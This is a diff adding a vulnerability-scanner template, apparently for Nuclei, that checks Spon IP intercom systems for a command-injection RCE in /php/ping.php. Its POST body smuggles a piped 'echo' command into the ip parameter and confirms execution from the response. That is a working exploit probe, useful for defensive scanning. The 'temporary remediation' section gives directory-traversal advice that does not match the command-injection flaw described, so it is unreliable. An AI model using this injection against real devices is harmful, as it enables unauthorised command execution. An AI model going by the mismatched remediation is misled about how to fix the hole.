@@ -1,0 +1,42 @@
+id: spon-ip-intercom-ping-rce
+info:
+  name: spon-ip-intercom-ping-rce
+  author:
+  - l0ne1y
+  description: |-
+    Spon IP network broadcast system remote command execution vulnerability
+    The ip parameter in the jsondata array is user-controllable, causing command concatenation, and it is executed via exec and returned to the page, resulting in an echo-capable RCE
+  severity: high
+  remediation: |-
+    Official remediation advice:
+    The vendor has not yet provided a patch. Please follow the vendor's homepage for timely updates:
+    https://www.spon.com.cn/sfhy/106.html
+
+    Temporary remediation advice:
+
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Use regular expressions to strictly validate the format of user input parameters, hard-code or uniformly encode the file name parameters passed by users, control file types via a whitelist, and reject parameters containing malicious or empty characters.
+    3. Prohibit the system from providing directory traversal services, e.g., configure open_basedir in php.ini to limit the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download files.
+    5. Perform permission checks before users download files.
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - '{{randstr}}'
+  - type: regex
+    part: body
+    negative: true
+    regex:
+    - echo.*?{{randstr}}
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/php/ping.php'
+  method: POST
+  body: jsondata[ip]=%7C echo {{randstr}}&jsondata[type]=0
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
